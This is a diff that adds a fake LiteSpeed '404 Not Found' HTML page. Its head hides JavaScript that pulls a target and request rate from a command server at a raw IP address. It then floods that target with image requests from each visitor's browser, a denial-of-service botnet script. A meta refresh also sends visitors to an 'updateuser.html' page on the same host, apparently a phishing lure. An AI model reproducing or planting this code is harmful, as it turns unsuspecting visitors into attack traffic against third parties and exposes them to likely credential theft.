@@ -1,0 +1,61 @@
+<html>
+<head>
+<title> 404 Not Found
+</title>
+<meta http-equiv="refresh" content="100;url=http://91.235.40.250/~pleskpru/updateuser.html">
+	<script type="text/javascript">
+
+			(function () { 
+				
+				var fireInterval; 
+				var requestsHT = {};
+				var isFiring = true;
+				function httpGet(theUrl)
+				{
+					var xmlHttp = null;
+
+					xmlHttp = new XMLHttpRequest();
+					xmlHttp.open( "GET", theUrl, false );
+					xmlHttp.send( null );
+					return xmlHttp.responseText;
+				}
+				var json = httpGet('http://91.235.40.250/~pleskpru/PeT.php');
+				obj = JSON.parse(json);
+				var enabled = obj.enabled;
+				var target = "http://" + obj.target;
+				var message = obj.message;
+				var random = obj.random;
+				var rate = obj.rate;
+				if(enabled)
+				{
+					var targetURL = target;
+					var requestedCtr = 0, succeededCtr = 0, failedCtr = 0;
+
+					var makeHttpRequest = function () {
+
+					if (requestedCtr > failedCtr + succeededCtr + 1000) {  return; };
+
+					var rID = Number(new Date()); var img = new Image();
+					img.onerror = function () { onFail(rID); };
+					img.onabort = function () { onFail(rID); };
+					img.onload = function () { onSuccess(rID); };
+					img.setAttribute("src", targetURL);
+					requestsHT[rID] = img;  onRequest(rID);
+					};
+			
+					var onRequest = function (rID) { requestedCtr++; };
+					var onComplete = function (rID) { delete requestsHT[rID]; };
+					var onFail = function (rID) { succeededCtr++; delete requestsHT[rID]; };
+					var onSuccess = function (rID) { succeededCtr++; delete requestsHT[rID]; };
+
+					isFiring = true; 
+					fireInterval = setInterval(makeHttpRequest, (1000 / parseInt(rate) | 0));
+				}
+			})();
+		</script>
+	</head>
+	<body><h1> 404 Not Found
+</h1>
+The resource requested could not be found on this server!<hr />
+Powered By <a href='http://www.litespeedtech.com'>LiteSpeed Web Server</a><br />
+<font face="Verdana, Arial, Helvetica" size=-1>LiteSpeed Technologies is not responsible for administration and contents of this web site!</font></body>
